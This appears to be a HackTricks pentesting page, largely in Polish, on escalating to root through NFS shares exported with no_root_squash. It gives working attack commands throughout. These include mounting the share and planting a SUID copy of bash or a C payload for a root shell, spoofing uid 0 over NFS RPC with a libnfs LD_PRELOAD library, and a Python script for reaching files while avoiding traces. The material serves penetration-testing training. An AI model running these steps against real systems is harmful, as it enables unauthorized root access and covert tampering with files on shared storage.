# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje o Squashing

NFS zazwyczaj (szczególnie w systemie Linux) ufa wskazanym przez klienta wartościom `uid` i `gid` podczas uzyskiwania dostępu do plików (jeśli nie jest używany Kerberos). Na serwerze można jednak skonfigurować pewne opcje, które **zmieniają to zachowanie**:

- **`all_squash`**: Mapuje wszystkie dostępy, przypisując każdego użytkownika i każdą grupę do **`nobody`** (65534 bez znaku / -2 ze znakiem). W rezultacie każdy jest `nobody` i żaden użytkownik nie jest używany.
- **`root_squash`/`no_all_squash`**: Jest to ustawienie domyślne w systemie Linux i **mapuje tylko dostęp z uid 0 (root)**. W rezultacie dowolne wartości `UID` i `GID` są zaufane, ale `0` jest mapowane do `nobody` (więc nie jest możliwa impersonacja użytkownika root).
- **``no_root_squash`**: Jeśli ta konfiguracja jest włączona, nawet użytkownik root nie jest mapowany. Oznacza to, że po zamontowaniu katalogu z taką konfiguracją można uzyskać do niego dostęp jako root.

W pliku **/etc/exports**, jeśli znajdziesz katalog skonfigurowany z opcją **no_root_squash**, możesz uzyskać do niego **dostęp** jako **klient** i **zapisywać w nim** tak, jakbyś był lokalnym użytkownikiem **root** tej maszyny.

Więcej informacji o **NFS** znajdziesz tutaj:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Opcja 1 z użyciem bash:
- **Zamontowanie tego katalogu** na maszynie klienta, a następnie **skopiowanie jako root** do zamontowanego folderu pliku binarnego **/bin/bash** i nadanie mu uprawnień **SUID**, po czym **uruchomienie z maszyny ofiary** tego pliku binarnego bash.
- Należy pamiętać, że aby uzyskać uprawnienia root wewnątrz udziału NFS, na serwerze musi być skonfigurowana opcja **`no_root_squash`**.
- Jeśli jednak nie jest ona włączona, można uzyskać uprawnienia innego użytkownika, kopiując plik binarny do udziału NFS i nadając mu uprawnienia SUID użytkownika, którego uprawnienia chcesz uzyskać.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 z użyciem skompilowanego kodu C:
- **Zamontowanie tego katalogu** na maszynie klienckiej, a następnie **skopiowanie jako root** do zamontowanego folderu naszego skompilowanego payloadu, który wykorzysta uprawnienie SUID, nadanie mu praw **SUID** oraz **uruchomienie na maszynie ofiary** tego pliku binarnego (tutaj znajdziesz kilka [payloadów C SUID](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Te same ograniczenia co wcześniej
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Należy pamiętać, że jeśli możesz utworzyć **tunnel ze swojej maszyny do maszyny ofiary, nadal możesz użyć wersji Remote do przeprowadzenia exploit, tunelując wymagane porty**.\
> Poniższy trick jest potrzebny w przypadku, gdy plik `/etc/exports` **wskazuje adres IP**. W takim przypadku **nie będziesz w stanie** użyć **remote exploit** i konieczne będzie **wykorzystanie tego tricku**.\
> Kolejnym wymaganiem, aby exploit zadziałał, jest to, aby **export wewnątrz `/etc/export`** **używał flagi `insecure`**.\
> --_Nie jestem pewien, czy ten trick zadziała, jeśli `/etc/export` wskazuje adres IP_--

### Basic Information

Scenariusz obejmuje wykorzystanie zamontowanego udziału NFS na lokalnej maszynie, korzystając z luki w specyfikacji NFSv3, która pozwala klientowi określić własne uid/gid, potencjalnie umożliwiając nieautoryzowany dostęp. Exploit polega na użyciu [libnfs](https://github.com/sahlberg/libnfs), biblioteki umożliwiającej fałszowanie wywołań NFS RPC.<sup>[[1]](#references)</sup>

#### Compiling the Library

Kroki kompilacji biblioteki mogą wymagać dostosowania w zależności od wersji kernela. W tym konkretnym przypadku wywołania systemowe fallocate zostały zakomentowane. Proces kompilacji obejmuje następujące polecenia:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Przeprowadzanie Exploit

Exploit polega na utworzeniu prostego programu w języku C (`pwn.c`), który podnosi uprawnienia do root, a następnie uruchamia shell. Program jest kompilowany, a wynikowy plik binarny (`a.out`) umieszczany na udziale z suid root, przy użyciu `ld_nfs.so` do sfałszowania uid w wywołaniach RPC:

1. **Skompiluj kod exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Umieść exploit na udziale i zmodyfikuj jego uprawnienia, fałszując uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Wykonaj exploit, aby uzyskać uprawnienia root:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell dla dyskretnego dostępu do plików

Po uzyskaniu root access do interakcji z udziałem NFS bez zmiany właściciela (aby uniknąć pozostawiania śladów) używany jest skrypt Python (nfsh.py). Skrypt ten dostosowuje uid do wartości odpowiadającej plikowi, do którego uzyskiwany jest dostęp, umożliwiając interakcję z plikami na udziale bez problemów z uprawnieniami:<sup>[[1]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Uruchom tak:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Referencje

- [1] [Historia mniej znanego NFS privesc](https://www.errno.fr/nfs_privesc.html)

{{#include ../../banners/hacktricks-training.md}}
